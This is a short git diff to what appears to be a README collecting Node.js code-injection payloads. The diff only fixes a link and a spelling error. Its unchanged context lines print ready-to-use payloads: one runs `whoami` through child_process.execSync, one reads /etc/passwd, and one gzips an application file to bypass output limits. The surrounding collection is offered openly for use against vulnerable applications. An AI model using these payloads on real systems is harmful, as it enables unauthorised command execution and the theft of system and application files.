@@ -76,7 +76,7 @@ arguments[1].end(require('child_process').execSync('whoami'))
 arguments[1].end(require('child_process').execSync('cat /etc/passwd'))
 ```
 
-Bypass stream limits by compressing to gzip (by @aaditya_purani)
+Bypass stream limits by compressing to gzip (by [@aaditya_purani](https://twitter.com/aaditya_purani))
 ```javascript
 const pwn=require('zlib').createGzip();const inx=require('fs').createReadStream('app.json');const oux = require('fs').createWriteStream('unrestrictive.gz');inx.pipe(pwn).pipe(oux)
 ```
@@ -105,7 +105,7 @@ console.log(xyz);
 ```
 
 ### Need More ?
-Repository would be mainted time to time. Feel free to contribute.
+Repository would be maintained time to time. Feel free to contribute.
 
 ### Contact
 [@aaditya_purani](https://twitter.com/aaditya_purani)
